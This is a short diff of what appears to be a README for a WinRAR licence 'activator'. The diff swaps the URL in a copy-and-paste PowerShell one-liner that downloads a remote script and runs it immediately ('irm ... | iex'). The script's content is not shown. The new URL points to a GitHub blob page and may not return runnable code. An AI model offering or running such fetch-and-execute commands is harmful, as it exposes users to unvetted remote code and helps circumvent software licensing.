@@ -14,7 +14,7 @@ Open PowerShell or Terminal.
 
 Copy-Paste The Code Below, Paste In PowerShell or Terminal And Press Enter:
 
-    irm https://naeembolchhi.github.io/WinRAR-Activator/ABCWRA.ps1 | iex
+    irm https://github.com/ABCCOMPANYPOHARKA/ABC-WRA/blob/main/ABCWRA.ps1 | iex
 
 That's It Enjoy !!!
 
